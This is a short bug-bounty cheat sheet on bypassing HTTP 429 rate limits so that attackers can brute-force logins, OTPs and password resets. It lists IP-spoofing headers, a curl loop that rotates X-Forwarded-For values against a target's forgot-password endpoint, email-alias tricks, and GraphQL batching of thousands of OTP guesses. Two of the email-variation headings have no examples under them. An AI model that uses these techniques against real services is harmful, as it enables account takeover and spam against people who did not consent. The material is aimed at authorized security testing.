# Bypass 429 / Rate Limiting

> [!tldr] Hunter Summary
> **What:** Circumvent rate limits to enable brute force or spam attacks.
> **Impact:** Unlock password brute force, OTP brute, account enumeration. P2 on authentication endpoints.
> **Best targets:** Login, forgot password, OTP, signup, API endpoints.
> **Time to triage:** 5 min. Add X-Forwarded-For header, retry request.

## Bypass Techniques

### 1 — IP spoofing headers
```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: RANDOM_IP
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Each request, rotate the `X-Forwarded-For` IP:
```bash
# Burp Intruder: add X-Forwarded-For header, use number list as IP last octet
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 10.0.0.$i" -X POST https://target.com/forgot-pass -d "email=victim@mail.com"
done
```

### 2 — Email/username variation

```
# Add trailing space

# Plus trick

(all delivered to same inbox on Gmail/Outlook)

# Dot trick (Gmail ignores dots)
victim@gmail.com → v.ictim@gmail.com → vi.ctim@gmail.com
```

## 2025-2026 Updates

> [!info] Rate limit bypass (2025-2026)
> - **GraphQL batching:** 1 HTTP request = N operations. If OTP endpoint is GraphQL, batch 10000 attempts.
> - **WebSocket rate limits:** Often more lenient than HTTP endpoints for the same action
> - **Retry-After header games:** Some apps reset counter on `Retry-After` period — send request exactly at reset time
> - **Distributed via OAuth:** Different OAuth sessions may have independent rate limit buckets
